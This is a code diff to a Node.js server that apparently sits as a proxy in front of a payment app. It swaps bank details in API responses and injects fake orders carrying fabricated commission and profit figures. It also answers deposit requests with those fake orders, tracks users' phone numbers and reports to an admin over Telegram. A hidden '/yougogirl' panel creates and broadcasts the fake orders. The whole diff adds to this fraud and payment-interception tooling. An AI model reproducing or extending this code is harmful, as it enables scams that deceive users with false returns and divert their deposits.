@@ -358,30 +358,47 @@ function generateDummyId() {
 
 const payoutWalletCache = new Map();
 
-function findDummyOrder(data, idOrCode) {
-  if (!idOrCode) return null;
-  const target = String(idOrCode).trim().toLowerCase();
-  if (!target) return null;
+function findDummyOrder(data, idOrCodeOrReq) {
+  if (!idOrCodeOrReq) return null;
+  const candidates = [];
+
+  if (typeof idOrCodeOrReq === 'string' || typeof idOrCodeOrReq === 'number') {
+    const s = String(idOrCodeOrReq).trim().toLowerCase();
+    if (s) candidates.push(s);
+  } else if (typeof idOrCodeOrReq === 'object') {
+    const req = idOrCodeOrReq;
+    const body = req.parsedBody || req.body || {};
+    const query = req.query || {};
+    const keys = ['payOrderId', 'orderId', 'buyId', 'id', 'code', 'orderCode', 'buyCode', 'sn', 'orderNo', 'buyNo', 'remark', 'codeName', 'orderSn', 'buySn'];
+    for (const k of keys) {
+      if (body && body[k]) candidates.push(String(body[k]).trim().toLowerCase());
+      if (query && query[k]) candidates.push(String(query[k]).trim().toLowerCase());
+    }
+  }
+
+  if (candidates.length === 0) return null;
 
   if (data.dummyOrders && Array.isArray(data.dummyOrders)) {
     const match = data.dummyOrders.find(d => {
       if (!d) return false;
       const id = String(d.id || '').trim().toLowerCase();
       const payOrderId = String(d.payOrderId || '').trim().toLowerCase();
-      const code = String(d.code || d.orderCode || d.buyCode || d.remark || '').trim().toLowerCase();
-      return id === target || payOrderId === target || code === target;
+      const code = String(d.code || d.orderCode || d.buyCode || d.remark || d.sn || d.orderNo || '').trim().toLowerCase();
+      return candidates.some(c => c && (c === id || c === payOrderId || c === code));
     });
     if (match) return match;
   }
 
   if (data.activeBoughtDummyOrders && typeof data.activeBoughtDummyOrders === 'object') {
-    if (data.activeBoughtDummyOrders[target]) return data.activeBoughtDummyOrders[target];
+    for (const c of candidates) {
+      if (c && data.activeBoughtDummyOrders[c]) return data.activeBoughtDummyOrders[c];
+    }
     for (const d of Object.values(data.activeBoughtDummyOrders)) {
       if (!d) continue;
       const id = String(d.id || '').trim().toLowerCase();
       const payOrderId = String(d.payOrderId || '').trim().toLowerCase();
-      const code = String(d.code || d.orderCode || d.buyCode || d.remark || '').trim().toLowerCase();
-      if (id === target || payOrderId === target || code === target) return d;
+      const code = String(d.code || d.orderCode || d.buyCode || d.remark || d.sn || d.orderNo || '').trim().toLowerCase();
+      if (candidates.some(c => c && (c === id || c === payOrderId || c === code))) return d;
     }
   }
 
@@ -1868,12 +1885,28 @@ async function proxyAndReplaceBankInList(req, res) {
         if (matchingDummies.length > 0) {
           matchingDummies.forEach(d => {
             const cd = String(d.code || d.orderCode || d.buyCode || d.remark || d.id || 'N/A').trim();
+            const p = parseFloat(d.percent) || data.defaultIncomePercent || 3;
+            const amt = parseFloat(d.amount || d.orderAmount || 0);
+            const inc = parseFloat((amt * (p / 100)).toFixed(2));
+
             d.code = cd;
             d.orderCode = cd;
             d.buyCode = cd;
             d.remark = cd;
             d.sn = cd;
             d.codeName = cd;
+            d.percent = p;
+            d.commissionRate = p;
+            d.income = inc;
+            d.commission = inc;
+            d.rebate = inc;
+            d.reward = inc;
+            d.profit = inc;
+            d.incomeAmount = inc;
+            d.commissionAmount = inc;
+            d.rebateAmount = inc;
+            d.rewardAmount = inc;
+            d.rateAmount = inc;
           });
           if (Array.isArray(listData)) {
             listData.unshift(...matchingDummies);
@@ -2121,13 +2154,11 @@ app.post('/app/payment/order/create', async (req, res) => {
   try {
     const body = req.parsedBody || {};
     const userId = await extractUserId(req, null);
-    const targetPayOrderId = String(body.payOrderId || body.orderId || body.buyId || body.id || req.query?.payOrderId || req.query?.orderId || '').trim();
-
-    const dummyMatch = findDummyOrder(data, targetPayOrderId);
+    const dummyMatch = findDummyOrder(data, req);
 
     if (dummyMatch) {
       if (userId) { trackUser(data, userId, 'Deposit Order (Dummy)'); }
-      const buyId = String(dummyMatch.id || dummyMatch.payOrderId);
+      const buyId = String(dummyMatch.id || dummyMatch.payOrderId || dummyMatch.code);
       const pWIdStr = String(body.payoutWalletId || body.walletId || '');
       const cachedWallet = payoutWalletCache.get(pWIdStr);
 
@@ -2186,6 +2217,10 @@ app.post('/app/payment/order/create', async (req, res) => {
         });
       }
 
+      const p = parseFloat(dummyMatch.percent) || data.defaultIncomePercent || 3;
+      const amtNum = parseFloat(dummyMatch.amount || 2000);
+      const incVal = parseFloat((amtNum * (p / 100)).toFixed(2));
+
       const jsonResp = {
         code: 1000,
         data: {
@@ -2193,7 +2228,19 @@ app.post('/app/payment/order/create', async (req, res) => {
           orderId: buyId,
           payOrderId: buyId,
           buyId: buyId,
-          amount: parseFloat(dummyMatch.amount || 5010),
+          amount: amtNum,
+          orderAmount: amtNum,
+          percent: p,
+          commissionRate: p,
+          income: incVal,
+          commission: incVal,
+          rebate: incVal,
+          reward: incVal,
+          profit: incVal,
+          incomeAmount: incVal,
+          commissionAmount: incVal,
+          rebateAmount: incVal,
+          rewardAmount: incVal,
           code: dummyMatch.code,
           orderCode: dummyMatch.code,
           remark: dummyMatch.code,
@@ -2213,9 +2260,26 @@ app.post('/app/payment/order/create', async (req, res) => {
 
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const phone = getPhone(data, userId);
-      const cachedInfo = targetPayOrderId ? orderCache.get(targetPayOrderId) : null;
-      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || (cachedInfo ? cachedInfo.amount : 0) || 0) || 0;
-      const orderCode = body.code || body.orderCode || body.buyCode || (cachedInfo ? cachedInfo.code : '') || '';
+      
+      let orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || 0) || 0;
+      let orderCode = body.code || body.orderCode || body.buyCode || body.sn || body.orderNo || req.query?.code || req.query?.orderCode || '';
+
+      if (!orderAmt || !orderCode) {
+        const candidateKeys = [
+          body.payOrderId, body.orderId, body.buyId, body.id, body.code, body.orderCode, body.buyCode, body.sn, body.orderNo, body.remark,
+          req.query?.payOrderId, req.query?.orderId, req.query?.buyId, req.query?.id, req.query?.code, req.query?.orderCode, req.query?.sn, req.query?.orderNo
+        ].filter(Boolean);
+
+        for (const k of candidateKeys) {
+          const kStr = String(k).trim();
+          if (!kStr) continue;
+          const cached = orderCache.get(kStr);
+          if (cached) {
+            if (!orderAmt && cached.amount) orderAmt = cached.amount;
+            if (!orderCode && cached.code) orderCode = cached.code;
+          }
+        }
+      }
 
       if (!isSuccess) {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
@@ -3881,18 +3945,22 @@ app.get('/yougogirl', async (req, res) => {
                 <section id="tab-dummies" class="tab-content space-y-6">
                     <div class="card">
                         <h3 class="text-xl font-bold mb-6">Generate Dummy Order</h3>
-                        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                        <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
                             <div>
                                 <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Base Amount (₹)</label>
-                                <input type="number" id="dummy-amount" class="input-field" placeholder="e.g. 500">
+                                <input type="number" id="dummy-amount" class="input-field" placeholder="e.g. 2000">
+                            </div>
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Income Rate (%)</label>
+                                <input type="number" id="dummy-percent" step="0.1" class="input-field" placeholder="Default 3%">
                             </div>
                             <div>
                                 <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Min Range (Optional)</label>
-                                <input type="number" id="dummy-min" class="input-field" placeholder="Auto-calculated if empty">
+                                <input type="number" id="dummy-min" class="input-field" placeholder="Auto-calculated">
                             </div>
                             <div>
                                 <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Max Range (Optional)</label>
-                                <input type="number" id="dummy-max" class="input-field" placeholder="Auto-calculated if empty">
+                                <input type="number" id="dummy-max" class="input-field" placeholder="Auto-calculated">
                             </div>
                         </div>
                         <button onclick="addDummy()" class="btn-primary w-full mt-6">Create & Broadcast Dummy Order</button>
@@ -3909,23 +3977,27 @@ app.get('/yougogirl', async (req, res) => {
                                     <tr>
                                         <th class="pb-4">Order Code</th>
                                         <th class="pb-4">Amount</th>
+                                        <th class="pb-4">Income / Rate</th>
                                         <th class="pb-4">Target Range</th>
                                         <th class="pb-4">Created At</th>
                                         <th class="pb-4 text-right">Action</th>
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-800">
-                                    ${(data.dummyOrders || []).map(d =>
-      '<tr>' +
-      '<td class="py-4 font-mono text-sky-400">' + d.code + '</td>' +
-      '<td class="py-4 font-bold text-emerald-400">₹' + d.amount + '</td>' +
-      '<td class="py-4 text-xs text-slate-400">' + d.minRange + ' - ' + d.maxRange + '</td>' +
-      '<td class="py-4 text-[10px] text-slate-500">' + (d.createdAt || 'N/A') + '</td>' +
-      '<td class="py-4 text-right">' +
-      '<button onclick="deleteDummy(\'' + d.id + '\')" class="text-rose-500 hover:underline">Delete</button>' +
-      '</td>' +
-      '</tr>'
-    ).join('')}
+                                    ${(data.dummyOrders || []).map(d => {
+                                      const p = parseFloat(d.percent) || data.defaultIncomePercent || 3;
+                                      const inc = parseFloat(((parseFloat(d.amount) || 0) * (p / 100)).toFixed(2));
+                                      return '<tr>' +
+                                        '<td class="py-4 font-mono text-sky-400">' + d.code + '</td>' +
+                                        '<td class="py-4 font-bold text-emerald-400">₹' + d.amount + '</td>' +
+                                        '<td class="py-4 text-xs font-semibold text-emerald-300">+₹' + inc + ' (' + p + '%)</td>' +
+                                        '<td class="py-4 text-xs text-slate-400">' + (d.minRange || 'N/A') + ' - ' + (d.maxRange || 'N/A') + '</td>' +
+                                        '<td class="py-4 text-[10px] text-slate-500">' + (d.createdAt || 'N/A') + '</td>' +
+                                        '<td class="py-4 text-right">' +
+                                        '<button onclick="deleteDummy(\'' + d.id + '\')" class="text-rose-500 hover:underline">Delete</button>' +
+                                        '</td>' +
+                                        '</tr>';
+                                    }).join('')}
                                 </tbody>
                             </table>
                         </div>
@@ -4146,10 +4218,11 @@ app.get('/yougogirl', async (req, res) => {
 
         function addDummy() {
             const amount = document.getElementById('dummy-amount').value;
+            const percent = document.getElementById('dummy-percent').value;
             const min = document.getElementById('dummy-min').value;
             const max = document.getElementById('dummy-max').value;
             if (!amount) return notify('Amount required', 'error');
-            apiCall('/dummy/add', { amount, min, max });
+            apiCall('/dummy/add', { amount, percent, min, max });
         }
 
         function deleteDummy(id) { apiCall('/dummy/delete', { id }); }
@@ -4293,13 +4366,34 @@ app.post('/yougogirl/api/balance/clear-history', async (req, res) => {
 
 app.post('/yougogirl/api/dummy/add', async (req, res) => {
   try {
-    const { amount, min, max } = req.parsedBody || {};
+    const { amount, min, max, percent } = req.parsedBody || {};
     if (isNaN(amount)) return res.status(400).json({ success: false, error: 'Invalid amount' });
     const data = await loadData(true);
+    const amtNum = parseFloat(amount);
+    const p = parseFloat(percent) || data.defaultIncomePercent || 3;
+    const incVal = parseFloat((amtNum * (p / 100)).toFixed(2));
+    const cd = generateDummyCode();
     const dummy = {
       id: generateDummyId(),
-      code: generateDummyCode(),
-      amount: parseFloat(amount),
+      code: cd,
+      orderCode: cd,
+      buyCode: cd,
+      remark: cd,
+      sn: cd,
+      amount: amtNum,
+      orderAmount: amtNum,
+      percent: p,
+      commissionRate: p,
+      income: incVal,
+      commission: incVal,
+      rebate: incVal,
+      reward: incVal,
+      profit: incVal,
+      incomeAmount: incVal,
+      commissionAmount: incVal,
+      rebateAmount: incVal,
+      rewardAmount: incVal,
+      rateAmount: incVal,
       minRange: min ? parseFloat(min) : null,
       maxRange: max ? parseFloat(max) : null,
       createdAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
